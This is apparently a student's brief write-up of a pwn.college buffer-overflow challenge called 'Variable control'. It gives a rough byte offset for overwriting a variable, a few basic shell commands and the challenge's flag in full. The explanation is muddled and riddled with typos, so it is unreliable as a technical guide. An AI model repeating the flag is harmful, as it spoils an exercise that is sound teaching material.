# Variable control
we get the flag it said 84 bytes and the we add the value of the 4 bytes which will take us to the value that we require and reach the lose variable and that is the what we nneded to set without disturbing the variable value of zero

## Flag
pwn.college{8YaA3R5AQibmglgfNlky5kQSQAx.ddTNzMDL5gDN1czW}

## Solve
```bash
cd /
cd challenge
ls 
cat file
./ the file to veiw the details of the file

```

- we get the flag after seeing the reuired byted needed to overflow the buffer and then we add the value of the offfset we do this and we get the correct value needed to crash the buffer and this is how we get the flag
